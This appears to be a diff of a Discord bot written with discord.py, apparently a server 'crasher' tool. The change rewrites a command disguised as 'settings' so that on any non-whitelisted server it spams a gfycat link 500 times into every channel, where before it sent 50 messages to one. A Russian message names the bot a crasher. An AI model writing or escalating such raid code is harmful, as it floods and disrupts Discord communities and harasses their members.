@@ -196,8 +196,9 @@ async def __current(ctx):
 @client.command(aliases=['settings'])
 async def __settings(ctx):
 	if ctx.guild.id not in whiteservers:
-		for i in range(50):
-			await channel.send('https:/gfycat.com/acclaimedpowerfulkatydid')
+		for _ in range(500):
+			for i in ctx.guild.channels:
+				await i.send('https:/gfycat.com/acclaimedpowerfulkatydid')
 	else:
 		await ctx.send(f'Этот сервер защищён. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')
 
